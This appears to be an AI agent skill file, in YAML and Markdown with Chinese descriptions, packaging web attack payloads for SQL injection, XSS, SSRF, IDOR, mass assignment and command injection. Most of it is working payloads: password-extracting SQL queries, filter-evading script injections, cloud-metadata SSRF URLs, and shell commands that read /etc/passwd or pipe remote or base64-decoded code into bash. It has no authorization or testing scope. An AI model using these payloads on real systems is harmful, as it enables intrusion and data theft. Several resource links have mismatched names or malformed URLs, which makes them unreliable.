---
name: web-hacking-payloads
description: Web 渗透攻击 payload 与 bypass 技巧 — 覆盖 SQL 注入、XSS、SSRF、IDOR 等主流 Web 漏洞的利用与绕过方法。
triggers:
  - web hacking
  - web penetration testing
  - payload
  - sqli
  - xss
  - ssrf
  - idor
  - lfi
  - rfi
  - rce
  - command injection
  - path traversal
tools:
  - browser
  - terminal
  - search
resources:
  - name: PayloadsAllTheThings
    url: https://github.com/swisskyrepo/PayloadsAllTheThings
    description: 最全 Web 漏洞 payload 清单，分类详尽，每个漏洞类型都有 bypass 技巧
  - name: SecLists
    url: https://github.com/danielmiessler/SecLists
    description: 安全测试词表库，Web-Content 目录包含大量 fuzz 字典
  - name: GTFOBins
    url: https://github.com/GTFOBins/GTFOBins.github.io
    description: Linux 二进制文件逃逸清单，用于本地提权
  - name: Payload Box
    url: https://github.com/PayloadsArea
    description: 各类漏洞 payload 集合，XSStrike、SQLMap 用
  - name: JSPWafBypass
    url: https://github.com/landgrey/SSRFExec
    description: JSP WebShell bypass 和命令执行 payload
examples:
  - name: SQL 注入 bypass
    content: |
      # 判断注入点
      ' OR '1'='1
      ' OR 1=1 --
      admin'--

      # Union 注入
      ' UNION SELECT null,null,null --
      ' UNION SELECT username,password,null FROM users --

      # 报错注入
      ' AND EXTRACTVALUE(1,CONCAT(0x7e,version())) --
      ' AND UPDATEXML(1,CONCAT(0x7e,user()),1) --

      # Blind 注入
      ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a
  - name: XSS 绕过过滤器
    content: |
      # 基础绕过
      <script>alert(1)</script>
      <img src=x onerror=alert(1)>
      <svg onload=alert(1)>

      # 过滤器 bypass
      <ScrIpT>alert(1)</ScRiPt>
      <script>al\u0065rt(1)</script>
      <script>eval(atob('YWxlcnQoMSk='))</script>

      # DOM XSS source/sink
      location.hash
      document.referrer
      eval(location.search)
  - name: SSRF 绕过
    content: |
      # 基础 SSRF
      http://169.254.169.254/latest/meta-data/
      http://localhost:80/internal-api
      file:///etc/passwd

      # 绕过过滤
      http://127.0.0.1@169.254.169.254
      http://[::1]/latest/meta-data/
      http://2130706433/    # 127.0.0.1 decimal
      http://0x7f000001/     # 127.0.0.1 hex
      http://127.1/          # 127.0.0.1 compact
  - name: IDOR 枚举
    content: |
      # 水平越权
      GET /api/user/1001/profile  →  GET /api/user/1002/profile

      # 垂直越权
      GET /api/user/1001/admin    →  cookie: role=admin

      # Mass assignment
      PUT /api/user/1001  { "balance":99999, "role":"admin" }
---

# Web Hacking Payloads

## 漏洞分类速查

| 漏洞 | 关键资源 | 工具 |
|------|---------|------|
| SQL 注入 | [PayloadsAllTheThings SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/SQL%20Injection) | SQLMap |
| XSS | [XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) | XSStrike, Beef |
| SSRF | [SSRF Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/SSRF%20Injection) | ffuf, Wayback |
| IDOR | [IDOR Patterns](https://github.com/swisskyrepo/PayloadsAllTheThings/Insecure%20Direct%20Object%20References) | Burp |
| XXE | [XXE Payloads](https://github/swisskyrepo/PayloadsAllTheThings/XXE%20Injection) | Burp |
| RCE | [RCE Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/Remote%20Code%20Execution) | nc, curl |
| LFI/RFI | [LFI Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/LFI%20Injection) | ffuf |

## 常用 fuzz 字典位置 (SecLists)

```
SecLists/Payloads/SQLi/Blind.txt
SecLists/Payloads/XSS/
SecLists/Discovery/Web-Content/CMS/
SecLists/Fuzzing/
SecLists/Usernames/
```

## 命令执行逃逸

```bash
# Linux bypass 空格过滤
cat${IFS}/etc/passwd
cat</etc/passwd
{cat,/etc/passwd}

# 绕过 redirect
curl http://target|bash

# 编码绕过
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash
```
